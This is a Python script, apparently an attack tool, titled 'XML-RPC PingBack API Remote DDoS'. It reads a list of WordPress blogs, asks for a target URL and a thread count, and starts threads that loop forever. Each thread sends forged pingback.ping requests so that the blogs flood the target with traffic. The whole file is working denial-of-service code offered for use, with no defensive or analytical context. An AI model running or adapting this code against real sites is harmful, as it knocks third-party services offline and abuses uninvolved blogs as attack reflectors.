import sys, socket, threading, time, os

Lock = threading.Lock()
N = 0
class PingBack(threading.Thread):
    blog = None
    
    def __init__(self, url, number, lista):
        threading.Thread.__init__(self)
        self.url = url
        self.number = number
        self.lista = lista
        self.blog = None
        
    def run(self):
        global N
        Lock.acquire()
        print ("Starting thread #%3d" % self.number)
        Lock.release()
        time.sleep(2)
        while True:
            self.blog = self.lista[N]
            N += 1
            if N > (len(self.lista) - 1):
                N = 0
            
            try:
                function_pingback = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>" % (self.url, self.blog)
                request_lenght = len(function_pingback)
                self.blog_cleaned = self.blog.split("?p=")[0]
                self.blog_cleaned1 = self.blog_cleaned.split("http://")[1].split("/")[0]
                request = "POST %s/xmlrpc.php HTTP/1.0\r\nHost: %s\r\nUser-Agent: Internal Wordpress RPC connection\r\nContent-Type: text/xml\r\nContent-Length: %s\r\n\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>%s</string></value></param><param><value><string>%s</string></value></param></params></methodCall>\r\n\r\n" % (self.blog_cleaned, self.blog_cleaned1, request_lenght, self.url, self.blog)
              
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
                s.connect((self.blog_cleaned1, 80))
                s.send(request.encode())
                print ("Thread %3d | %2d | Blog %s" % (self.number, N, self.blog_cleaned1))
            except:
                print ("Thread %3d | %2d | Connection refused!!" % (self.number, N))

def title():
    os.system("title ...:: XMLRPC PingBack DDoS ::... ")
    os.system("color a")
    print ("""-------------------------------------------------------------------------\n
\tXML-RPC PingBack API Remote DDoS
\tDate : 20/04/2014
\tPython 3.3.3
\tPython version coded by : Mafiaga\n
--------------------------------------------------------------------------\n\n""")

    
def main():
    title()
    try:
        in_file = open("list.txt", "r")
        lista = []
        for i in in_file:
            lista.append(i)
    except:
        print ("Я не могу найти list.txt Для запуска программы вам это необходимо")
        os.system("pause")
        sys.exit(0)
    num_thread = int(input("Количество потоков: "))
    url = str(input("Цель: "))
    print("\n###############################################")
    for i in range(num_thread):
        PingBack(url, i+1, lista).start()
    print("###############################################\n")

if __name__ == "__main__":
    main()
